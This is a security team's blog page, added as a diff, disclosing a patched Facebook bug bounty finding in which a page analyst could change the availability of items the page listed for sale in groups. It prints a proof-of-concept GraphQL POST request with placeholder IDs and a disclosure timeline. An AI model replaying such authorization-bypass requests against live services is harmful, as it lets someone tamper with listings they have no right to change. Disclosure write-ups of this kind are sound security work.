@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
+<title>
+	
+		Facebook Change product availability as a PageAnalyst -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="Symbo1 Security Team Post.">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<link rel="alternate" type="application/rss+xml" title="Symbo1's RSS Feed" href="/feed.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="/projects">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+	</ul>
+</nav>
+
+		<main>
+			<style>
+	body{
+		word-break:break-word;
+	}
+</style>
+
+<div class="post-content">
+<div id="post">
+<h1 align="center">Facebook Change product availability as a PageAnalyst</h1>
+<!-- <link rel="stylesheet" type="text/css" href="/statics/css/syntax.css"> -->
+  <p align="right" class="date">25 Jan 2019 - onehackzero</p>
+
+<h2 id="description">Description</h2>
+
+<p>   This bug could have let a malicious page analyst modify the availability of an item put up for sale by the page in a group linked to the page.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">HTTP</span> <span class="nx">POST</span>
+
+<span class="nx">graph</span><span class="p">.</span><span class="nx">facebook</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">graphql</span><span class="o">/</span>
+
+<span class="nx">query_id</span><span class="o">=</span><span class="nx">QUERYID</span>
+<span class="nx">query_params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"3"</span><span class="p">:</span><span class="s2">"false"</span><span class="p">,</span><span class="s2">"1"</span><span class="p">:</span><span class="s2">"image/jpeg"</span><span class="p">,</span><span class="s2">"2"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="s2">"0"</span><span class="p">:{</span><span class="s2">"surface"</span><span class="p">:</span><span class="s2">"GROUP_POST_CHEVRON"</span><span class="p">,</span><span class="s2">"actor_id"</span><span class="p">:</span><span class="s2">"PageID"</span><span class="p">,</span><span class="s2">"client_mutation_id"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="s2">"product_availability"</span><span class="p">:</span><span class="s2">"IN_STOCK"</span><span class="p">,</span><span class="s2">"story_id"</span><span class="p">:</span><span class="s2">"&lt;base64 encoded&gt;"</span><span class="p">}}</span></code></pre></figure>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+  <li>Jan 4, 2018 - Report Sent</li>
+  <li>Jan 10, 2018 - Further investigation by Facebook</li>
+  <li>Jan 23, 2019 - Fixed by Facebook</li>
+  <li>Jan 25, 2019 - Bounty Awarded by Facebook</li>
+</ul>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/JwZw6QJ_d18" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+
+</div>
+</div>
+		</main>
+		
+			<footer>
+	<div id="disqus_thread"></div>
+<script>
+
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://www-symbo1-com.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</footer>
+		
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
